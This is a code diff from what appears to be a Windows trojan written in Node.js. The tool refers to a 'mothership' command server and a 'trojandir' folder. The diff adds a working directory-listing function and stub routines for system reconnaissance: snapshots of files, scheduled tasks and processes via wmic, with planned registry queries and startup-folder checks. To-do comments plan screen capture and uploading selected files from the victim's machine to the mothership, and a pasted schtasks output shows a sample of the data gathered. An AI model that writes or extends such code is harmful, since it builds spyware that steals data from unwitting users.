@@ -28,6 +28,9 @@
 
 // --- TASKS LIST ---
 
+// ! implement get screen capture + upload to mothership
+// ! implement upload files (scan machine, upload selected files to mothership)
+
 // ! motership selection process
 
 // ! read/write/parse/retrieve config
@@ -3728,6 +3731,57 @@ async function pspcmon() {
     logmsg("finished");
 }
 
+async function getDirInfo(dirPath) {
+    try {
+        const files = await fs.readdir(dirPath);
+
+        const fileDetails = await Promise.all(
+
+            files.map(async (file) => {
+                const filePath = path.join(dirPath, file);
+                const stats = await fs.stat(filePath);
+
+                return {
+                    filepath: filePath,
+                    filename: file,
+                    sizeBytes: stats.size,
+                    modifiedDate: stats.mtime,
+                    isDirectory: stats.isDirectory()
+                };
+
+            }) 
+        );
+
+        return fileDetails;
+    } catch (error) {
+        logmsg(error);
+        return null;
+    }
+}
+
+// TODO
+async function getscreencapture() {
+    logmsg("starting");
+
+    let runningcmd = systemstate.cmdconfig;
+}
+
+// TODO -- we need upload mechanism -- upload.php
+async function getsystemoverview() {
+    logmsg("starting");
+
+    let runningcmd = systemstate.cmdconfig;
+
+    let dir_snapshot = await getDirInfo(systemstate.trojandir);
+    let task_snapshot= await getTasks();
+    let process_snapshot = await getProcessList_wmic();
+
+    // execute reg query on select registry locations
+    // stat startup folder paths
+
+    logmsg("finished");
+}
+
 // ---
 
 function logMsgMothership(msg) {
@@ -3740,6 +3794,7 @@ function logEventMothership(event_code, kvp) {
 
 // ---
 
+// TODO modify routine to retrieve full task details
 async function getTasks() {
     logmsg("starting");
 
@@ -3772,6 +3827,37 @@ async function getTasks() {
 
     return tasknames;
 }
+/*
+Folder: \Microsoft\XblGameSave
+HostName:                             SJPCP507
+TaskName:                             \Microsoft\XblGameSave\XblGameSaveTask
+Next Run Time:                        N/A
+Status:                               Ready
+Logon Mode:                           Interactive/Background
+Last Run Time:                        11/30/1999 12:00:00 AM
+Last Result:                          267011
+Author:                               Microsoft
+Task To Run:                          %windir%\System32\XblGameSaveTask.exe standby
+Start In:                             N/A
+Comment:                              XblGameSave Standby Task
+Scheduled Task State:                 Enabled
+Idle Time:                            Only Start If Idle for  minutes, If Not Idle Retry For  minutes Stop the task if Idle State end
+Power Management:                     No Start On Batteries
+Run As User:                          SYSTEM
+Delete Task If Not Rescheduled:       Disabled
+Stop Task If Runs X Hours and X Mins: 02:00:00
+Schedule:                             Scheduling data is not available in this format.
+Schedule Type:                        At idle time
+Start Time:                           N/A
+Start Date:                           N/A
+End Date:                             N/A
+Days:                                 N/A
+Months:                               N/A
+Repeat: Every:                        N/A
+Repeat: Until: Time:                  N/A
+Repeat: Until: Duration:              N/A
+Repeat: Stop If Still Running:        N/A
+*/
 
 async function createTask(taskname) {
     logmsg(`starting -- task ${taskname}`);
